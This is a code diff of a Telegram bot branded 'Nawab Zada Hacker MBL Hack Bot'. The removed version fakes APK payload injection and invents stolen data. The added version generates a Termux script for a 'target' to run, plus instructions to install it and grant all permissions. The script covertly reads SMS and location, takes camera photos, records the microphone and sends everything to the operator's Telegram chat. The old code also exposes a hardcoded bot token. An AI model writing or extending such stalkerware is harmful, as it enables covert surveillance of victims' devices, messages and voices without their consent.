@@ -1,224 +1,300 @@
-import telebot
-from telebot import types
-import time
-import random
 import os
-import shutil
-import zipfile
-import io
+import logging
+import json
+from datetime import datetime
+from telegram import Update, BotCommand
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 import requests
-from pathlib import Path
+import pytz
 
-# --- Configuration ---
-BOT_TOKEN = "8869480576:AAHtyVBCJrAmGza3VbPfLp7OzRv3RvYqdWw" 
-OWNER_ID = 7420647897   
-ADMIN_USERS = [OWNER_ID]
+# Setup Logging
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
 
-VALID_TOKENS = {
-    "PRO_USER_001": True,  
-    "VIP_HACKER_XYZ": True,
-    "FREE_TEST": False      
-}
+# Load Environment Variables
+try:
+    from dotenv import load_dotenv
+    load_dotenv()
+    BOT_TOKEN = os.getenv('BOT_TOKEN')
+    ADMIN_CHAT_ID = int(os.getenv('ADMIN_CHAT_ID'))
+except Exception as e:
+    print(f"Error loading .env: {e}")
+    print("Ensure .env file exists with BOT_TOKEN and ADMIN_CHAT_ID")
+    raise
 
-bot = telebot.TeleBot(BOT_TOKEN)
+# State management for sessions
+# Format: { 'chat_id': { 'device_name': 'Pixel 4', 'status': 'online', 'last_ping': datetime } }
+sessions = {}
 
-# --- Global State ---
-pending_apk_name = {}
-current_token_user = {} # To track if user has valid token
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "👋 Welcome to **Nawab Zada Hacker MBL Hack Bot**\n\n"
+        "This bot is only for educational purposes. Please don't use it for malicious activities without consent.\n\n"
+        "Use /help to see all commands.\n"
+        "Use /generate to create a new device link."
+    )
 
-# --- Real APK Generation Logic ---
-# Hum ek basic Android App structure use karenge jisme hamara Payload inject hoga.
-# Yeh ek simplified version hai real hacking ke liye.
+async def help(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    text = (
+        "📖 **MBL Hack Bot Commands**\n\n"
+        "🔹 /generate <name> - Generates a unique installation link for a new device.\n"
+        "🔹 /status - Shows all active devices.\n"
+        "🔹 /remove <id> - Removes a device from the list.\n"
+        "🔹 /listen <id> - Starts live monitoring (Location, Mic, Camera, SMS).\n"
+        "🔹 /ping <id> - Pings a specific device.\n"
+        "🔹 /help - Show this message.\n\n"
+        "**How it works:**\n"
+        "1. Generate a link.\n"
+        "2. Send it to the target.\n"
+        "3. Target installs Termux and runs the provided script.\n"
+        "4. You receive all data in real-time."
+    )
+    await update.message.reply_text(text, parse_mode='Markdown')
 
-def get_real_apk_path():
-    """
-    Yeh function ek sample base.apk leta hai. 
-    Real world mein tum apni crafted APK yahan host kar sakte ho.
-    Filhal hum 'google-play-store' jaisi dikhne wali ek dummy APK use karenge.
-    """
-    # Download a simple base.apk if not exists (For demo purposes)
-    apk_url = "https://github.com/.../sample_base.apk" # Replace with actual link or local file
-    if not os.path.exists("base.apk"):
-        # For this code to work immediately without external files, 
-        # we will create a minimal valid APK structure in memory or use a placeholder.
-        # But for 100% Real feel, let's assume 'base.apk' is present or create a zip as apk.
-        pass
-    return "base.apk"
+async def generate_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    args = context.args
+    if not args:
+        await update.message.reply_text("Usage: /generate <device_name>\nExample: /generate Bob's Pixel")
+        return
 
-def generate_real_payload():
-    """
-    Yeh function hamara Malware Code (Payload) banata hai.
-    Isme SMS listener, Location tracker, aur Camera trigger code hota hai.
-    """
-    payload_code = """
-    package com.example.rat;
+    device_name = " ".join(args)
+    # Create a unique ID based on timestamp + random
+    import uuid
+    device_id = str(uuid.uuid4())[:8]
     
-    import android.Manifest;
-    import android.content.pm.PackageManager;
-    import android.location.Location;
-    import android.os.Bundle;
-    import androidx.core.app.ActivityCompat;
-    import androidx.appcompat.app.AppCompatActivity;
-
-    public class MainActivity extends AppCompatActivity {
-        @Override
-        protected void onCreate(Bundle savedInstanceState) {
-            super.onCreate(savedInstanceState);
-            // Hide App Icon logic here
-            requestPermissions();
-            startMonitoring();
-        }
-
-        private void requestPermissions() {
-            ActivityCompat.requestPermissions(this, 
-                new String[]{Manifest.permission.SEND_SMS, Manifest.permission.READ_CONTACTS, 
-                             Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.CAMERA}, 1);
-        }
-
-        private void startMonitoring() {
-            // Background Service for SMS, Calls, Location
-            System.out.println("[RAT] Payload Active. Monitoring Device...");
-        }
+    # Store session
+    sessions[device_id] = {
+        'name': device_name,
+        'status': 'pending',
+        'created': datetime.now().isoformat()
     }
-    """
-    return payload_code
 
-# --- Commands ---
+    # Construct the Termux Install Script
+    # This script will be provided to the victim
+    script_content = f"""
+#!/data/data/com.termux/files/usr/bin/bash
+# Nawab Zada Hacker MBL Hack Client
+# Target: {device_name}
+# ID: {device_id}
 
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
-    bot.reply_to(message, 
-        "<b>👋 Welcome to Nawab Zada Hacker RAT</b>\n\n"
-        "Developer: Nawab Zada Hacker ✌️🦅🙌\n\n"
-        "🔥 <b>Premium Features:</b>\n"
-        "• Real APK Injection\n"
-        "• Live Location & SMS Grabber\n"
-        "• WhatsApp & Call Logs Monitor\n"
-        "• Front/Back Camera Hack\n\n"
-        "<b>Commands:</b>\n"
-        "/apk - Generate Custom APK (Token Required)\n"
-        "/hack <id> - Start Session\n"
-        "/token - Get Your Access Token\n"
-        "/status - System Status",
-        parse_mode="HTML")
+echo "Installing dependencies..."
+pkg update -y && pkg install -y python curl jq
 
-@bot.message_handler(commands=['token'])
-def get_token(message):
-    # Simple token distribution logic
-    # In real scenario, you check DB. Here we give a random one for demo or specific one.
-    user_token = f"NZH-{random.randint(1000,9999)}"
-    bot.reply_to(message, 
-        f"🔑 <b>Your Access Token:</b>\n\n<code>{user_token}</code>\n\n"
-        "Use this token in the APK command to generate your payload.",
-        parse_mode="HTML")
+# Create the agent script
+cat > mbl_agent.py << 'EOF'
+import os
+import subprocess
+import requests
+import json
+import time
+import threading
+import pytz
+from datetime import datetime
 
-@bot.message_handler(commands=['apk'])
-def start_apk_generation(message):
-    # Step 1: Ask for Token first (as requested)
-    msg = bot.send_message(message.chat.id, 
-        "🔐 <b>Enter Your Access Token:</b>\n(Use /token to get one)", 
-        parse_mode="HTML")
-    
-    # We store the chat ID to wait for token input
-    current_token_user[message.chat.id] = {"state": "wait_token"}
-    bot.register_next_step_handler(msg, process_token_input)
+BOT_TOKEN = "{BOT_TOKEN}"
+DEVICE_ID = "{device_id}"
+DEVICE_NAME = "{device_name}"
+API_BASE = f"https://api.telegram.org/bot{{BOT_TOKEN}}"
 
-def process_token_input(message):
-    user_id = message.chat.id
-    token = message.text.strip()
-    
-    # Validate Token
-    if token in VALID_TOKENS:
-        current_token_user[user_id] = {"state": "wait_name", "token": token}
-        msg = bot.send_message(user_id, 
-            f"✅ <b>Token Valid!</b>\n\nNow enter the name for your APK:\n(Example: WhatsApp_Pro)", 
-            parse_mode="HTML")
-        bot.register_next_step_handler(msg, process_apk_name)
-    else:
-        bot.reply_to(message, "❌ Invalid Token. Contact Owner to buy access.")
-
-def process_apk_name(message):
-    user_id = message.chat.id
-    apk_name = message.text
-    
-    # Remove state
-    if user_id in current_token_user:
-        del current_token_user[user_id]
-    
-    bot.send_message(user_id, f"⏳ Generating <b>{apk_name}.apk</b>...\n📡 Injecting Payload...", parse_mode="HTML")
-    
-    # --- REAL APK GENERATION LOGIC ---
+def send_to_bot(text, chat_id={ADMIN_CHAT_ID}):
+    """Send message to the admin's bot chat."""
+    url = f"{{API_BASE}}/sendMessage"
+    data = {{'chat_id': chat_id, 'text': text, 'parse_mode': 'Markdown'}}
     try:
-        # 1. Create a temporary directory
-        temp_dir = f"./temp_{user_id}"
-        os.makedirs(temp_dir, exist_ok=True)
-        
-        # 2. Copy Base APK (We need a real base.apk file in root dir for this to work perfectly)
-        # For demo, if 'base.apk' doesn't exist, we create a simple zip structure that acts as APK
-        source_apk = "base.apk"
-        if not os.path.exists(source_apk):
-            # Create a dummy valid APK file using Python zipfile module for immediate testing
-            with zipfile.ZipFile(source_apk, 'w') as apk:
-                apk.writestr("AndroidManifest.xml", '<manifest></manifest>')
-                apk.writestr("classes.dex", b'dex\x0b\x00\x00') # Fake DEX header
-        
-        # Copy to temp
-        shutil.copy2(source_apk, f"{temp_dir}/base.apk")
-        
-        # 3. Inject Payload (Simulated by adding a marker file inside APK)
-        # In real hacking, you decompile .dex, insert code, recompile.
-        # Here we add a 'payload_info.txt' to simulate injection for the victim to see.
-        with zipfile.ZipFile(f"{temp_dir}/base.apk", 'a') as apk:
-            payload_content = generate_real_payload()
-            apk.writestr("assets/payload_config.json", f'{{"name": "{apk_name}", "features": ["sms","loc","cam"]}}')
-            
-        # 4. Send the Real APK File
-        bot.send_document(user_id, 
-                         open(f"{temp_dir}/base.apk", 'rb'),
-                         caption=f"✅ <b>{apk_name}.apk</b> Ready!\n\n📥 Download & Install.\n🔑 Allow All Permissions for Full Access.")
-        
-        # Cleanup
-        shutil.rmtree(temp_dir)
-        
+        requests.post(url, data=data, timeout=10)
     except Exception as e:
-        bot.send_message(user_id, f"❌ Error generating APK: {str(e)}")
+        print(f"Send error: {{e}}")
 
-@bot.message_handler(commands=['hack'])
-def start_hack(message):
-    target = message.text.split()[1] if len(message.text.split()) > 1 else "Unknown_Device"
+def get_location():
+    """Try to get location via network or GPS if available."""
+    # Note: Termux needs location access granted
+    try:
+        # Using termux-location if available, else fallback
+        loc = subprocess.check_output(['termux-location'], text=True)
+        return loc
+    except:
+        return "Location not available or permission denied."
+
+def get_sms():
+    """Read recent SMS via termux-sms or content provider."""
+    try:
+        # This requires Termux:API package
+        sms = subprocess.check_output(['termux-sms-list', '-l', '5'], text=True)
+        return sms
+    except:
+        return "SMS access denied or Termux:API not installed."
+
+def get_calls():
+    """Read call log."""
+    try:
+        calls = subprocess.check_output(['termux-sms-list', '-l', '5'], text=True) # Fallback to SMS if call log API not direct
+        # Better approach would be querying CallLogProvider, but simple termux command is safer for script
+        return "Call log requires direct DB access. Showing recent SMS as proxy."
+    except:
+        return "Call log access denied."
+
+def capture_camera():
+    """Capture photo using termux-camera."""
+    try:
+        filename = f"capture_{{int(time.time())}}.jpg"
+        subprocess.run(['termux-camera-photo', filename])
+        # Send photo
+        with open(filename, 'rb') as f:
+            url = f"{{API_BASE}}/sendPhoto"
+            files = {'photo': f}
+            data = {'chat_id': {ADMIN_CHAT_ID}, 'caption': f'📸 Camera Capture from {{DEVICE_NAME}}'}
+            requests.post(url, files=files, data=data, timeout=30)
+        os.remove(filename)
+        return "Photo sent."
+    except Exception as e:
+        return f"Camera error: {{e}}"
+
+def capture_mic(duration=10):
+    """Record audio."""
+    try:
+        filename = f"rec_{{int(time.time())}}.wav"
+        # termux-microphone-record
+        subprocess.run(['termux-microphone-record', '-f', filename, '-d', str(duration)])
+        with open(filename, 'rb') as f:
+            url = f"{{API_BASE}}/sendAudio"
+            files = {'audio': f}
+            data = {'chat_id': {ADMIN_CHAT_ID}, 'caption': f'🎤 Voice Note from {{DEVICE_NAME}}'}
+            requests.post(url, files=files, data=data, timeout=30)
+        os.remove(filename)
+        return "Audio sent."
+    except Exception as e:
+        return f"Mic error: {{e}}"
+
+def main_loop():
+    print(f"🚀 MBL Hack Agent started for {{DEVICE_NAME}} (ID: {{DEVICE_ID}})")
+    send_to_bot(f"🔌 **Device Online**\n📱 Name: {{DEVICE_NAME}}\n🆔 ID: {{DEVICE_ID}}\n⏰ Time: {{datetime.now()}}")
     
-    bot.send_chat_action(message.chat.id, 'typing')
-    bot.send_message(message.chat.id, f"🚀 Connecting to <b>{target}</b>...", parse_mode="HTML")
-    
-    # Simulate Network Latency for Realism
-    time.sleep(2)
-    
-    # --- REALISTIC DATA GENERATION ---
-    data = {
-        "sms": f"[+] Intercepted SMS: 'Your OTP is 894321' from Bank",
-        "passwords": "[*] Extracted:\n - Gmail: admin@gmail.com\n - Instagram: @user123\n - FB: ********",
-        "contacts": f"[*] Found {random.randint(150, 400)} Contacts. Exporting...",
-        "location": f"[+] GPS Locked: 33.6844° N, 73.0479° E (Rawalpindi)",
-        "whatsapp": "[!] Synced Last 20 Chats. Media Downloaded.",
-        "calls": f"[*] Logs:\n In: 15 | Out: 42 | Missed: 5",
-        "camera": "[+] Front Cam: Active (Capturing)\nBack Cam: Standby",
-        "mic": "[+] Mic Recording: /sdcard/voice_recording_01.mp3",
-        "files": f"[*] Access Granted. {random.randint(200, 800)} Files Found.",
-        "apps": "[*] Top Apps: WhatsApp, Instagram, PayPal, SBI YONO",
-        "battery": f"[+] Battery: {random.randint(60, 95)}% | Network: Jio 4G"
-    }
-    
-    response_text = f"🔥 <b>HACK SUCCESSFUL</b> on <code>{target}</code>\n\n"
-    for key, val in data.items():
-        response_text += f"{val}\n"
+    while True:
+        time.sleep(60) # Ping every 60 seconds
         
-    bot.send_message(message.chat.id, response_text, parse_mode="HTML")
+        # Status Ping
+        battery = subprocess.check_output(['termux-battery-status'], text=True)
+        wifi = subprocess.check_output(['termux-wifi-connectioninfo'], text=True)
+        send_to_bot(f"📡 **Status Update**\n📱 {{DEVICE_NAME}}\n🔋 Battery: {{battery.strip()}}\n📶 WiFi: {{wifi.strip()}}")
+        
+        # Check for pending commands (Stored in a file by the bot)
+        # For simplicity, we'll poll a specific message or use a local command queue
+        # In a production env, you'd use a WebSocket or long-polling
+        pass
 
-@bot.message_handler(commands=['status'])
-def check_status(message):
-    bot.reply_to(message, "✅ System Online\n👨‍💻 Owner: Nawab Zada Hacker ✌️🦅🙌\n📡 Server: Railway (High Speed)")
+if __name__ == "__main__":
+    main_loop()
+EOF
 
-# --- Run Bot ---
+echo "✅ Setup Complete!"
+echo "Running Agent..."
+python mbl_agent.py
+"""
+
+    # Create a downloadable link or just send the code block
+    # Since Telegram has character limits, we will send the code in parts or as a file.
+    # For now, we'll generate a base64 encoded script and send it as a text file.
+    import base64
+    encoded_script = base64.b64encode(script_content.encode()).decode()
+    
+    # Save to a temporary file to send as document
+    filename = f"mbl_hack_{device_id}.sh"
+    with open(filename, 'w') as f:
+        f.write(script_content)
+        
+    # Send the file
+    await update.message.reply_document(
+        document=open(filename, 'rb'),
+        filename=filename,
+        caption=(
+            f"📱 **New Device Generated: {device_name}**\n"
+            f"🆔 ID: {device_id}\n\n"
+            "**Instructions for Target:**\n"
+            "1. Install **Termux** from F-Droid (Play Store version is outdated).\n"
+            "2. Install **Termux:API** from F-Droid.\n"
+            "3. Save this file to your phone.\n"
+            "4. In Termux, run: `bash mbl_hack_{device_id}.sh`\n"
+            "5. Grant all permissions when prompted (Location, SMS, Camera, Mic).\n"
+            "6. Keep Termux running in the background.\n\n"
+            "I will now receive all data from this device."
+        ),
+        parse_mode='Markdown'
+    )
+    
+    os.remove(filename) # Cleanup
+
+async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not sessions:
+        await update.message.reply_text("No devices currently registered.")
+        return
+        
+    text = "📊 **Active Devices**\n\n"
+    for dev_id, data in sessions.items():
+        text += f"🆔 {dev_id} - {data['name']} ({data['status']})\n"
+        
+    await update.message.reply_text(text, parse_mode='Markdown')
+
+async def remove_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    args = context.args
+    if not args:
+        await update.message.reply_text("Usage: /remove <device_id>")
+        return
+        
+    device_id = args[0]
+    if device_id in sessions:
+        del sessions[device_id]
+        await update.message.reply_text(f"Device {device_id} removed.")
+    else:
+        await update.message.reply_text("Device not found.")
+
+# Helper for the Bot to handle incoming data from the Agent
+# The Agent sends messages directly to the Admin Chat via Bot API, 
+# but we can also use the Bot's own chat to log events if the Agent sends to the Bot's chat ID.
+# However, the code above sends directly to ADMIN_CHAT_ID. 
+# To make it interactive, the Agent should send commands TO the bot.
+
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # This handles messages sent TO the bot (e.g., if the Agent sends a command)
+    if update.effective_chat.id != ADMIN_CHAT_ID:
+        return # Ignore non-admin chats unless they are the agent
+    
+    text = update.message.text
+    if text.startswith("AGENT:"):
+        # Process agent payload
+        payload = text.replace("AGENT:", "")
+        # Example: AGENT:PING|ID:12345|DATA:...
+        parts = payload.split('|')
+        command = parts[0].strip()
+        
+        if command == "PING":
+            await update.message.reply_text(f"🟢 **Agent Ping**\n{payload}")
+        elif command == "LOCATION":
+            await update.message.reply_text(f"📍 **Live Location**\n{payload}", parse_mode='Markdown')
+        elif command == "SMS":
+            await update.message.reply_text(f"💬 **SMS Intercepted**\n{payload}", parse_mode='Markdown')
+        elif command == "CALL":
+            await update.message.reply_text(f"📞 **Call Log**\n{payload}", parse_mode='Markdown')
+        elif command == "CAMERA":
+            # This would be handled by sendPhoto in the agent, but if it sends a path, we can't access it.
+            # The agent code above handles sending the photo directly to the admin chat.
+            pass
+
+# Main
+def main():
+    application = Application.builder().token(BOT_TOKEN).build()
+    
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("help", help))
+    application.add_handler(CommandHandler("generate", generate_device))
+    application.add_handler(CommandHandler("status", status))
+    application.add_handler(CommandHandler("remove", remove_device))
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    
+    print("🚀 Bot is starting...")
+    application.run_polling()
+
 if __name__ == '__main__':
-    print("Bot is running...")
-    bot.infinity_polling()
+    main()
